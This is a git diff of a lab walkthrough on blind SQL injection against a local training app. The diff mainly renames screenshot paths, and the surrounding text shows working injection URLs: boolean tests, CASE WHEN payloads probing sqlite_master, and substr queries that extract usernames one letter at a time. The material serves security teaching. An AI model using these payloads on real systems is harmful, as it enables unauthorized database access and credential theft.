@@ -20,7 +20,7 @@ Now that the app is running let's go hacking!
 
 The first step is to identify parameters which could be potentially used in an SQL query to communicate with the underlying database. In this example we find that the "/home" method grabs data by pageID and displays the content.
 
-![](../../.gitbook/assets/sqli-blind-1.png)
+![](../../.gitbook/assets/python/SQLI-Blind/1.png)
 
 ```text
 http://localhost:5000/home/1
@@ -30,7 +30,7 @@ http://localhost:5000/home/1
 
 Now let's see if we can create an error by injecting a single quote
 
-![](../../.gitbook/assets/sqli-blind-2.png)
+![](../../.gitbook/assets/python/SQLI-Blind/2.png)
 
 ```text
 http://localhost:5000/home/1'
@@ -44,7 +44,7 @@ Now we need to inject logic operators to check if the application is vulnerable 
 
 First, we inject a logical operator which is true \(or 1=1\). This should result in the application run as intended without errors.
 
-![](../../.gitbook/assets/sqli-blind-3.png)
+![](../../.gitbook/assets/python/SQLI-Blind/3.png)
 
 ```text
 http://localhost:5000/home/1 OR 1=1
@@ -52,7 +52,7 @@ http://localhost:5000/home/1 OR 1=1
 
 After that we inject a logical operator which is false \(and 1=2\). This should result in the application returning an error.
 
-![](../../.gitbook/assets/sqli-blind-4.png)
+![](../../.gitbook/assets/python/SQLI-Blind/4.png)
 
 ```text
 http://localhost:5000/home/1 AND 1=2--
@@ -74,13 +74,13 @@ Now that we know that the application is vulnerable for SQL injections we are go
 
 We need to determine which conditions are TRUE and FALSE for the application. By trial and error it's possible to determine the pageIDs 1,2 and 3 are valid, whereas 4 is not.
 
-![](../../.gitbook/assets/sqli-blind-6.png)
+![](../../.gitbook/assets/python/SQLI-Blind/5.png)
 
 ```text
 http://localhost:5000/home/1
 ```
 
-![](../../.gitbook/assets/sqli-blind-5.png)
+![](../../.gitbook/assets/python/SQLI-Blind/6.png)
 
 ```text
 http://localhost:5000/home/4
@@ -90,7 +90,7 @@ http://localhost:5000/home/4
 
 Now, we need to inject a IF condition, returning 1 for the TRUE cases and 4 for the FALSE ones.
 
-![](../../.gitbook/assets/sqli-blind-7.png)
+![](../../.gitbook/assets/python/SQLI-Blind/7.png)
 
 ```text
 http://localhost:5000/home/(select case when 1=1 then 1 else 4 end)
@@ -102,7 +102,7 @@ Next step is to add more logic to our injection and starting to retrieve informa
 
 Let's check if the table users exists.
 
-![](../../.gitbook/assets/sqli-blind-9.png)
+![](../../.gitbook/assets/python/SQLI-Blind/8.png)
 
 ```text
 http://localhost:5000/home/(select case when tbl_name='users' then 1 else 4 end from sqlite_master where type='table')
@@ -112,17 +112,13 @@ Good news! As we didn't see an error, it means the table _users_ exists.
 
 By testing different table names, we will receive an 404 error, indicating the table does not exist.
 
-![](../../.gitbook/assets/sqli-blind-8.png)
+![](../../.gitbook/assets/python/SQLI-Blind/9.png)
 
 ### Step 4
 
-From the _user_ table is possible to see that the table contains the columns _UserId_ , _UserName_ and _Password_
-
-![](../../.gitbook/assets/sqli-blind-10.png)
-
 Let's try to extract a valid user. Instead of having a dictionary of possible users to guess, we can check if the first letter of the first user contains the letter _a_.
 
-![](../../.gitbook/assets/sqli-blind-11.png)
+![](../../.gitbook/assets/python/SQLI-Blind/10.png)
 
 ```text
 http://localhost:5000/home/(select case when substr(UserName,1,1)='a' then 1 else 4 end from users limit 0,1)
@@ -130,7 +126,7 @@ http://localhost:5000/home/(select case when substr(UserName,1,1)='a' then 1 els
 
 The error indicates it's not the case. Let's try with the letter _A_. Remember, case matters.
 
-![](../../.gitbook/assets/sqli-blind-12.png)
+![](../../.gitbook/assets/python/SQLI-Blind/11.png)
 
 ```text
 http://localhost:5000/home/(select case when substr(UserName,1,1)='A' then 1 else 4 end from users limit 0,1)
